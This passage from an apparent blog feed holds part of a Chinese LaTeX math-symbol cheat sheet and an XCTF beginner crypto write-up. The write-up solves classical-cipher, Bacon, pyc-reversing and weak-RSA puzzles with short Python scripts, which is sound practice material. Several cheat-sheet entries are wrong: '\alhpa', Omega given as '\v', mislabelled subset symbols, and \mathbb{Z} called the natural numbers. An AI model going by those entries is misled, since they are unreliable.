0}{\frac{x}{y}}$</p></li><li><p>积分运算，符号：<code>\int</code>，如：$\int^{\infty}_{0}{xdx}$</p></li><li><p>积分运算，符号：<code>\displaystyle \int</code>，如：$\displaystyle \int^{\infty}_{0}{xdx}$</p></li><li><p>微分运算，符号：<code>\partial</code>，如：$\frac{\partial x}{\partial y}$</p></li><li><p>矩阵表示，符号：<code>\begin{matrix} \end{matrix}</code>，如：$\left[ \begin{matrix} 1 &amp;2 &amp;\cdots &amp;4 \\5 &amp;6 &amp;\cdots &amp;8\\ \vdots &amp;\vdots &amp;\ddots &amp;\vdots \\13 &amp;14 &amp;\cdots &amp;16\end{matrix} \right]$</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line">\begin&#123;matrix&#125;</span><br><span class="line"><span class="number">1</span> &amp; <span class="number">2</span> &amp; <span class="number">3</span>\\</span><br><span class="line"><span class="number">4</span> &amp; <span class="number">5</span> &amp; <span class="number">6</span>\\</span><br><span class="line">\end&#123;matrix&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure><script type="math/tex; mode=display">\begin{matrix}1 & 2 & 3\\4 & 5 & 6\\\end{matrix}</script></li></ol><h2 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h2><ol><li>等于运算，符号：<code>=</code>，如：$x+y=z$</li><li>大于运算，符号：<code>&gt;</code>，如：$x+y&gt;z$</li><li>小于运算，符号：<code>&lt;</code>，如：$x+y&lt;z$</li><li>大于等于运算，符号：<code>\geq</code>，如：$x+y \geq z$</li><li>小于等于运算，符号：<code>\leq</code>，如：$x+y \leq z$</li><li>不等于运算，符号：<code>\neq</code>，如：$x+y \neq z$</li><li>不大于等于运算，符号：<code>\ngeq</code>，如：$x+y \ngeq z$</li><li>不大于等于运算，符号：<code>\not\geq</code>，如：$x+y \not\geq z$</li><li>不小于等于运算，符号：<code>\nleq</code>，如：$x+y \nleq z$</li><li>不小于等于运算，符号：<code>\not\leq</code>，如：$x+y \not\leq z$</li><li>约等于运算，符号：<code>\approx</code>，如：$x+y \approx z$</li><li>恒定等于运算，符号：<code>\equiv</code>，如：$x+y \equiv z$</li></ol><h2 id="集合运算"><a href="#集合运算" class="headerlink" title="集合运算"></a>集合运算</h2><ol><li>属于运算，符号：<code>\in</code>，如：$x \in y$</li><li>不属于运算，符号：<code>\notin</code>，如：$x \notin y$</li><li>不属于运算，符号：<code>\not\in</code>，如：$x \not\in y$</li><li>子集运算，符号：<code>\subset</code>，如：$x \subset y$</li><li>子集运算，符号：<code>\supset</code>，如：$x \supset y$</li><li>真子集运算，符号：<code>\subseteq</code>，如：$x \subseteq y$</li><li>非真子集运算，符号：<code>\subsetneq</code>，如：$x \subsetneq y$</li><li>真子集运算，符号：<code>\supseteq</code>，如：$x \supseteq y$</li><li>非真子集运算，符号：<code>\supsetneq</code>，如：$x \supsetneq y$</li><li>非子集运算，符号：<code>\not\subset</code>，如：$x \not\subset y$</li><li>非子集运算，符号：<code>\not\supset</code>，如：$x \not\supset y$</li><li>并集运算，符号：<code>\cup</code>，如：$x \cup y$</li><li>交集运算，符号：<code>\cap</code>，如：$x \cap y$</li><li>差集运算，符号：<code>\setminus</code>，如：$x \setminus y$</li><li>同或运算，符号：<code>\bigodot</code>，如：$x \bigodot y$</li><li>同与运算，符号：<code>\bigotimes</code>，如：$x \bigotimes y$</li><li>实数集合，符号：<code>\mathbb{R}</code>，如： $\mathbb{R}$</li><li>自然数集合，符号：<code>\mathbb{Z}</code>，如：$\mathbb{Z}$</li><li>空集，符号：<code>\emptyset</code>，如：$\emptyset$</li></ol><h2 id="数学符号"><a href="#数学符号" class="headerlink" title="数学符号"></a>数学符号</h2><ol><li>无穷，符号：<code>\infty</code>，如：$\infty$</li><li>虚数，符号：<code>\imath</code>，如：$\imath$</li><li>虚数，符号：<code>\jmath</code>，如：$\jmath$</li><li>数学符号，符号<code>\hat{a}</code>，如：$\hat{a}$</li><li>数学符号，符号<code>\check{a}</code>，如：$\check{a}$</li><li>数学符号，符号<code>\breve{a}</code>，如：$\breve{a}$</li><li>数学符号，符号<code>\tilde{a}</code>，如：$\tilde{a}$</li><li>数学符号，符号<code>\bar{a}</code>，如：$\bar{a}$</li><li>矢量符号，符号<code>\vec{a}</code>，如：$\vec{a}$</li><li>数学符号，符号<code>\acute{a}</code>，如：$\acute{a}$</li><li>数学符号，符号<code>\grave{a}</code>，如：$\grave{a}$</li><li>数学符号，符号<code>\mathring{a}</code>，如：$\mathring{a}$</li><li>一阶导数符号，符号<code>\dot{a}</code>，如：$\dot{a}$</li><li>二阶导数符号，符号<code>\ddot{a}</code>，如：$\ddot{a}$</li><li>上箭头，符号：<code>\uparrow</code>，如：$\uparrow$</li><li>上箭头，符号：<code>\Uparrow</code>，如：$\Uparrow$</li><li>下箭头，符号：<code>\downarrow</code>，如：$\downarrow$</li><li>下箭头，符号：<code>\Downarrow</code>，如：$\Downarrow$</li><li>左箭头，符号：<code>\leftarrow</code>，如：$\leftarrow$</li><li>左箭头，符号：<code>\Leftarrow</code>，如：$\Leftarrow$</li><li>右箭头，符号：<code>\rightarrow</code>，如：$\rightarrow$</li><li>右箭头，符号：<code>\Rightarrow</code>，如：$\Rightarrow$</li><li>底端对齐的省略号，符号：<code>\ldots</code>，如：$1,2,\ldots,n$</li><li>中线对齐的省略号，符号：<code>\cdots</code>，如：$x_1^2 + x_2^2 + \cdots + x_n^2$</li><li>竖直对齐的省略号，符号：<code>\vdots</code>，如：$\vdots$</li><li>斜对齐的省略号，符号：<code>\ddots</code>，如：$\ddots$</li><li>单波浪线,符号: <code>\sim</code> , 如: $\sim$</li></ol><h2 id="希腊字母"><a href="#希腊字母" class="headerlink" title="希腊字母"></a>希腊字母</h2><div class="table-container"><table><thead><tr><th>字母</th><th>实现</th><th>字母</th><th>实现</th></tr></thead><tbody><tr><td>A</td><td><code>A</code></td><td>α</td><td><code>\alhpa</code></td></tr><tr><td>B</td><td><code>B</code></td><td>β</td><td><code>\beta</code></td></tr><tr><td>Γ</td><td><code>\Gamma</code></td><td>γ</td><td><code>\gamma</code></td></tr><tr><td>Δ</td><td><code>\Delta</code></td><td>δ</td><td><code>\delta</code></td></tr><tr><td>E</td><td><code>E</code></td><td>ϵ</td><td><code>\epsilon</code></td></tr><tr><td>Z</td><td><code>Z</code></td><td>ζ</td><td><code>\zeta</code></td></tr><tr><td>H</td><td><code>H</code></td><td>η</td><td><code>\eta</code></td></tr><tr><td>Θ</td><td><code>\Theta</code></td><td>θ</td><td><code>\theta</code></td></tr><tr><td>I</td><td><code>I</code></td><td>ι</td><td><code>\iota</code></td></tr><tr><td>K</td><td><code>K</code></td><td>κ</td><td><code>\kappa</code></td></tr><tr><td>Λ</td><td><code>\Lambda</code></td><td>λ</td><td><code>\lambda</code></td></tr><tr><td>M</td><td><code>M</code></td><td>μ</td><td><code>\mu</code></td></tr><tr><td>N</td><td><code>N</code></td><td>ν</td><td><code>\nu</code></td></tr><tr><td>Ξ</td><td><code>\Xi</code></td><td>ξ</td><td><code>\xi</code></td></tr><tr><td>O</td><td><code>O</code></td><td>ο</td><td><code>\omicron</code></td></tr><tr><td>Π</td><td><code>\Pi</code></td><td>π</td><td><code>\pi</code></td></tr><tr><td>P</td><td><code>P</code></td><td>ρ</td><td><code>\rho</code></td></tr><tr><td>Σ</td><td><code>\Sigma</code></td><td>σ</td><td><code>\sigma</code></td></tr><tr><td>T</td><td><code>T</code></td><td>τ</td><td><code>\tau</code></td></tr><tr><td>Υ</td><td><code>\Upsilon</code></td><td>υ</td><td><code>\upsilon</code></td></tr><tr><td>Φ</td><td><code>\Phi</code></td><td>ϕ</td><td><code>\phi</code></td></tr><tr><td>X</td><td><code>X</code></td><td>χ</td><td><code>\chi</code></td></tr><tr><td>Ψ</td><td><code>\Psi</code></td><td>ψ</td><td><code>\psi</code></td></tr><tr><td>Ω</td><td><code>\v</code></td><td>ω</td><td><code>\omega</code></td></tr></tbody></table></div><h2 id="向量相关"><a href="#向量相关" class="headerlink" title="向量相关"></a>向量相关</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span>\vec&#123;a&#125;<span class="symbol">$</span></span><br><span class="line"><span class="symbol">$</span>\vec&#123;AB&#125;<span class="symbol">$</span></span><br><span class="line"><span class="symbol">$</span>\vec&#123;ABC&#125;<span class="symbol">$</span></span><br><span class="line"><span class="symbol">$</span>\overrightarrow&#123;AB&#125;<span class="symbol">$</span></span><br><span class="line"><span class="symbol">$</span>\overleftarrow&#123;AB&#125;<span class="symbol">$</span></span><br></pre></td></tr></table></figure><p>$\vec{a}$<br>$\vec{AB}$<br>$\vec{ABC}$<br>$\overrightarrow{AB}$<br>$\overleftarrow{AB}$</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;md数学公式语法&quot;&gt;&lt;a href=&quot;#md数学公式语法&quot; class=&quot;headerlink&quot; title=&quot;md数学公式语法&quot;&gt;&lt;/a&gt;md数学公式语法&lt;/h1&gt;&lt;h2 id=&quot;行内与独行&quot;&gt;&lt;a href=&quot;#行内与独行&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="杂七杂八" scheme="https://mercer5.github.io/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
    
      <category term="基操" scheme="https://mercer5.github.io/tags/%E5%9F%BA%E6%93%8D/"/>
    
  </entry>
  
  <entry>
    <title>xctf-crypto-新手练习区</title>
    <link href="https://mercer5.github.io/2020/08/25/xctf-crypto-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/"/>
    <id>https://mercer5.github.io/2020/08/25/xctf-crypto-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/</id>
    <published>2020-08-25T00:37:43.000Z</published>
    <updated>2020-08-25T00:41:31.184Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xctf-crypto-新手练习区"><a href="#xctf-crypto-新手练习区" class="headerlink" title="xctf-crypto-新手练习区"></a>xctf-crypto-新手练习区</h1><h2 id="1-base64"><a href="#1-base64" class="headerlink" title="1. base64"></a>1. base64</h2><p>在线解密,或是自己写脚本都行</p><h2 id="2-Caesar"><a href="#2-Caesar" class="headerlink" title="2. Caesar"></a>2. Caesar</h2><p>同上</p><h2 id="3-Morse"><a href="#3-Morse" class="headerlink" title="3. Morse"></a>3. Morse</h2><p>同上</p><h2 id="4-混合编码"><a href="#4-混合编码" class="headerlink" title="4. 混合编码"></a>4. 混合编码</h2><ol><li>base64</li><li>html实体编码</li><li>base64</li><li>ascii</li></ol><h2 id="5-不仅仅是Morse"><a href="#5-不仅仅是Morse" class="headerlink" title="5. 不仅仅是Morse"></a>5. 不仅仅是Morse</h2><ol><li><p>morese解密</p><p>得到一串奇奇怪怪的东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MAY_BE_HAVE_ANOTHER_DECODEHHHHAAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA</span><br></pre></td></tr></table></figure></li><li><p>后面的AB的长度为170</p><ul><li>5的倍数</li><li>只有两个字母</li><li>2^5^为32,可以很方便的表示26个字母</li><li>所以假设0-25,分别对应a-z</li></ul></li><li><p>尝试解密看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#分割替换</span></span><br><span class="line">s=<span class="string">"AAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA"</span></span><br><span class="line">s=s.replace(<span class="string">"A"</span>,<span class="string">"0"</span>)</span><br><span class="line">s=s.replace(<span class="string">"B"</span>,<span class="string">"1"</span>)</span><br><span class="line">lst=[]</span><br><span class="line"><span class="keyword">while</span>(s):</span><br><span class="line">    lst.append(s[:<span class="number">5</span>])</span><br><span class="line">    s=s[<span class="number">5</span>:]</span><br><span class="line">print(lst)</span><br><span class="line"><span class="comment">#生成字典</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">b=string.ascii_lowercase</span><br><span class="line">l1=[]</span><br><span class="line">l2=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    l1.append(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    l2.append(i)</span><br><span class="line">dic=dict(zip(l2,l1))</span><br><span class="line">print(dic)</span><br><span class="line"><span class="comment">#flag</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    num=int(i,<span class="number">2</span>)</span><br><span class="line">    print(dic.get(num),end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure></li></ol><h2 id="6-幂数加密"><a href="#6-幂数加密" class="headerlink" title="6. 幂数加密"></a>6. 幂数加密</h2>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#字母数字对应表生成</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">l1=[]</span><br><span class="line">l2=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">    l1.append(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string.ascii_uppercase:</span><br><span class="line">    l2.append(i)</span><br><span class="line">dic=dict(zip(l1,l2))</span><br><span class="line">print(dic)</span><br><span class="line"><span class="comment">#字符串处理</span></span><br><span class="line">a=<span class="string">"8842101220480224404014224202480122"</span></span><br><span class="line">lst=a.split(<span class="string">"0"</span>)</span><br><span class="line">lst=[eval(x) <span class="keyword">for</span> x <span class="keyword">in</span> lst]</span><br><span class="line">lst1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    sum=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(i):</span><br><span class="line">        sum+=i%<span class="number">10</span></span><br><span class="line">        i=i//<span class="number">10</span></span><br><span class="line">    lst1.append(sum)</span><br><span class="line">print(lst1)</span><br><span class="line"><span class="comment">#flag</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst1:</span><br><span class="line">    flag+=dic[i]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="6-easychallenge"><a href="#6-easychallenge" class="headerlink" title="6. easychallenge"></a>6. easychallenge</h2><p>给的是一个pyc文件,我就在在线python反编译网站上反编译了一下</p><p>得到python原码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode1</span><span class="params">(ans)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = ord(i) ^ <span class="number">36</span></span><br><span class="line">        x = x + <span class="number">25</span></span><br><span class="line">        s += chr(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode2</span><span class="params">(ans)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = ord(i) + <span class="number">36</span></span><br><span class="line">        x = x ^ <span class="number">36</span></span><br><span class="line">        s += chr(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode3</span><span class="params">(ans)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> base64.b32encode(ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">' '</span></span><br><span class="line">print(<span class="string">'Please Input your flag:'</span>)</span><br><span class="line">flag = input()</span><br><span class="line">final = <span class="string">'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==='</span></span><br><span class="line"><span class="keyword">if</span> encode3(encode2(encode1(flag))) == final:</span><br><span class="line">    print(<span class="string">'correct'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'wrong'</span>)</span><br></pre></td></tr></table></figure><p>emmm,然后就好办了,加密方法都在上面了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s=<span class="string">"UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==="</span></span><br><span class="line">s1=base64.b32decode(s)</span><br><span class="line">print(s1)</span><br><span class="line"></span><br><span class="line">s2=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s1:</span><br><span class="line">    x=i^<span class="number">36</span></span><br><span class="line">    x-=<span class="number">36</span></span><br><span class="line">    s2+=chr(x)</span><br><span class="line">print(s2)</span><br><span class="line"></span><br><span class="line">s3=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s2:</span><br><span class="line">    x=ord(i)<span class="number">-25</span></span><br><span class="line">    x=x^<span class="number">36</span></span><br><span class="line">    s3+=chr(x)</span><br><span class="line">print(s3)</span><br></pre></td></tr></table></figure><h2 id="7-Normal-RSA"><a href="#7-Normal-RSA" class="headerlink" title="7. Normal_RSA"></a>7. Normal_RSA</h2><p>打开附件,里面是<code>pubkey.pem</code>和<code>flag.enc</code></p><p>我们可以利用kali里的openssl来搞</p><ol><li><p>把文件拖虚拟机里</p></li><li><p>终端输入openssl</p></li><li><p><code>openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem</code></p><ul><li>exponent:E</li><li>modulus:N</li></ul><p>以上两个要用复制好</p></li><li><p>上网找在线分解质因数的搞出P,Q</p></li><li><p>然后在kali中使用(代码如下,pqe自填),会生成一个private.pem</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">arsa=RSA.generate(<span class="number">1024</span>)</span><br><span class="line">arsa.p=</span><br><span class="line">arsa.q=</span><br><span class="line">arsa.e=</span><br><span class="line">arsa.n=arsa.p*arsa.q</span><br><span class="line">Fn=long((arsa.p<span class="number">-1</span>)*(arsa.q<span class="number">-1</span>))</span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    x=(Fn*i)+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(x%arsa.e==<span class="number">0</span>):</span><br><span class="line">           arsa.d=x/arsa.e</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">private=open(<span class="string">'private.pem'</span>,<span class="string">'w'</span>)</span><br><span class="line">private.write(arsa.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure></li><li><p>在终端中打开openssl,输入<code>rsautl -decrypt -in flag.enc -inkey private.pem</code></p></li><li><p>ojbk</p></li></ol><h2 id="8-转轮机加密"><a href="#8-转轮机加密" class="headerlink" title="8. 转轮机加密"></a>8. 转轮机加密</h2><p>题目:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>:  &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;</span><br><span class="line"><span class="number">2</span>:  &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;</span><br><span class="line"><span class="number">3</span>:  &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;</span><br><span class="line"><span class="number">4</span>:  &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;</span><br><span class="line"><span class="number">5</span>:  &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;</span><br><span class="line"><span class="number">6</span>:  &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;</span><br><span class="line"><span class="number">7</span>:  &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;</span><br><span class="line"><span class="number">8</span>:  &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;</span><br><span class="line"><span class="number">9</span>:  &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;</span><br><span class="line"><span class="number">10</span>: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;</span><br><span class="line"><span class="number">11</span>： &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt;</span><br><span class="line"><span class="number">12</span>： &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt;</span><br><span class="line"><span class="number">13</span>： &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;</span><br><span class="line"></span><br><span class="line">密钥为：<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">6</span></span><br><span class="line">密文为：NFQKSEVOQOFNP</span><br></pre></td></tr></table></figure><p>大概就像旧式电话一样</p><p>对应着电话号码(2,3,7,5,13,12,9,1,8,10,4,11,6)</p><p>把对应轮数中的对应字符(N F Q K S E V O Q O F N P)</p><p>拨到第一个去(看下图第一列,与密文相同)</p><p><img src="image-20200404230355691.png" alt="image-20200404230355691"></p><p>然后竖着看,直到找到有实际意义的字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">circle</span><span class="params">(string,char)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> string[<span class="number">0</span>]!=char:</span><br><span class="line">        string=string[<span class="number">1</span>:]+string[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line">s=<span class="string">"""ZWAXJGDLUBVIQHKYPNTCRMOSFE </span></span><br><span class="line"><span class="string">KPBELNACZDTRXMJQOYHGVSFUWI </span></span><br><span class="line"><span class="string">BDMAIZVRNSJUWFHTEQGYXPLOCK </span></span><br><span class="line"><span class="string">RPLNDVHGFCUKTEBSXQYIZMJWAO </span></span><br><span class="line"><span class="string">IHFRLABEUOTSGJVDKCPMNZQWXY </span></span><br><span class="line"><span class="string">AMKGHIWPNYCJBFZDRUSLOQXVET </span></span><br><span class="line"><span class="string">GWTHSPYBXIZULVKMRAFDCEONJQ </span></span><br><span class="line"><span class="string">NOZUTWDCVRJLXKISEFAPMYGHBQ </span></span><br><span class="line"><span class="string">XPLTDSRFHENYVUBMCQWAOIKZGJ </span></span><br><span class="line"><span class="string">UDNAJFBOWTGVRSCZQKELMXYIHP </span></span><br><span class="line"><span class="string">MNBVCXZQWERTPOIUYALSKDJFHG </span></span><br><span class="line"><span class="string">LVNCMXZPQOWEIURYTASBKJDFHG </span></span><br><span class="line"><span class="string">JZQAWSXCDERFVBGTYHNUMKILOP"""</span></span><br><span class="line">s=s.replace(<span class="string">" \n"</span>,<span class="string">" "</span>)</span><br><span class="line">lst=s.split(<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">key=<span class="string">"2,3,7,5,13,12,9,1,8,10,4,11,6"</span></span><br><span class="line">key=key.split(<span class="string">","</span>)</span><br><span class="line">key=[int(i)<span class="number">-1</span> <span class="keyword">for</span> i <span class="keyword">in</span> key]</span><br><span class="line"></span><br><span class="line">x=<span class="string">"NFQKSEVOQOFNP"</span></span><br><span class="line">end=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(x)):</span><br><span class="line">    tempstr=lst[key[i]]</span><br><span class="line">    word=x[i]</span><br><span class="line">    end.append(circle(tempstr,word))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">        print(end[j][i].lower(),end=<span class="string">""</span>)</span><br><span class="line">    print(<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">nfqksevoqofnp</span><br><span class="line">ahgcxiusnwcbn</span><br><span class="line">ctwpcubfotuvy</span><br><span class="line">zetmdrmezgkcc</span><br><span class="line">dqhneyczuvtxj</span><br><span class="line">tgszrtqwtrezb</span><br><span 